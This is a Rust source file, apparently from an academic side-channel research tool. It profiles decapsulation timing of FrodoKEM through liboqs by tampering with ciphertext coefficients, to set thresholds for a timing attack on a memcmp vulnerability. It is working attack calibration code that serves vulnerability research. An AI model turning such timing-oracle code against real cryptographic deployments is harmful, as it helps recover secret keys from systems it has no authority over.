#![allow(dead_code)]
use super::modify_and_measure::*;
use crate::attack::fo_timing::MeasureSource;
use crate::utils::save_to_csv;
use crate::utils::Rec;
use crate::utils::Recorder;
use crate::utils::SaveAllRecorder;
use liboqs_rs_bindings as oqs;
use log::{error, info, warn};
use log_derive::logfn_inputs;
use oqs::frodokem::FrodoKem;
use oqs::KemBuf;
use std::cell::RefCell;
use std::path::PathBuf;
use std::rc::Rc;

const THRESHOLD_WARN_LOW: u64 = 1000;
const THRESHOLD_WARN_HIGH: u64 = 10000;

#[derive(Debug, Clone)]
pub struct Profile {
    pub threshold: u64,
    pub cutoff: u64,
    pub recorders: Rc<RefCell<Vec<Recorder<SaveAllRecorder>>>>,
}

#[logfn_inputs(Trace)]
pub fn profile<FRODO: FrodoKem>(
    index: usize,
    warmup: u64,
    iterations: u64,
    measure_source: MeasureSource,
    secret_key: &mut FRODO::SecretKey,
    ciphertext: &mut FRODO::Ciphertext,
    save_to_file: Option<&PathBuf>,
) -> Result<Profile, String> {
    info!(
        "Launching the profile routine against {} MEMCMP vulnerability.",
        FRODO::NAME
    );
    let mut shared_secret_d = FRODO::SharedSecret::new();

    info!(
        "WARMUP ==> Running decryption oracle {} times for warmup.",
        warmup
    );
    let mut recorders = vec![];
    let cutoff = {
        let rec = mod_measure::<FRODO, _>(
            0,
            index,
            warmup,
            &measure_source,
            ciphertext,
            &mut shared_secret_d,
            secret_key,
            Recorder::saveall("WARMUP", None),
        )?;
        let mean = rec.aggregated_value()?;
        let minimum_value = rec.min()?;
        let cutoff = mean + (mean - minimum_value);
        info!(
            "PROFILING ==> using {} as the cutoff value to remove outliers (minimum warmup latency: {}, mean: {}).",
            cutoff, minimum_value, mean
        );
        recorders.push(rec);
        cutoff
    };

    let lowmod = 1;

    info!("PROFILING ==> Running {} iterations ciphertextmod of C[{}] += {}, to establish upper bound timing threshold.", iterations, index, lowmod);
    let threshold_high = {
        let rec = mod_measure::<FRODO, _>(
            lowmod,
            index,
            iterations,
            &measure_source,
            ciphertext,
            &mut shared_secret_d,
            secret_key,
            Recorder::saveall(format!("LOMOD[{}]", index), Some(cutoff)),
        )?;
        let t = rec.aggregated_value()?;
        recorders.push(rec);
        t
    };

    let maxmod = FRODO::error_correction_limit() * 2 - 10;

    info!("PROFILING ==> Running {} iterations ciphertextmod of C[{}] += {}, to establish lower bound timing threshold.", iterations, index, maxmod);
    let threshold_low = {
        let rec = mod_measure::<FRODO, _>(
            maxmod,
            index,
            iterations,
            &measure_source,
            ciphertext,
            &mut shared_secret_d,
            secret_key,
            Recorder::saveall(format!("HIMOD[{}]", index), Some(cutoff)),
        )?;
        let t = rec.aggregated_value()?;
        recorders.push(rec);
        t
    };

    if let Some(path) = save_to_file {
        info!("Saving measurments to file {:?}", path);
        save_to_csv(path, &recorders)?;
    }

    if threshold_high <= threshold_low {
        error!(
            "threshold high ({}) <= threshold low ({})",
            threshold_high, threshold_low
        );
        return Err("Could not make a good enough profile, try again with a higher profiling iteration count!".to_string());
    }

    let diff = threshold_high - threshold_low;

    if !(THRESHOLD_WARN_LOW..=THRESHOLD_WARN_HIGH).contains(&diff) {
        warn!(
            "Diff ({}) is not between expected values {} and {}",
            diff, THRESHOLD_WARN_LOW, THRESHOLD_WARN_HIGH
        );
    }

    let threshold = threshold_low + (diff / 2);
    info!(
        "PROFILING ==> Using ({}+{})/2={} as threshold value (diff: {}), everything below will be used to detect changes to B as well.", threshold_high, threshold_low,
        threshold, threshold_high - threshold_low
    );

    Ok(Profile {
        threshold,
        cutoff,
        recorders: Rc::new(RefCell::new(recorders)),
    })
}
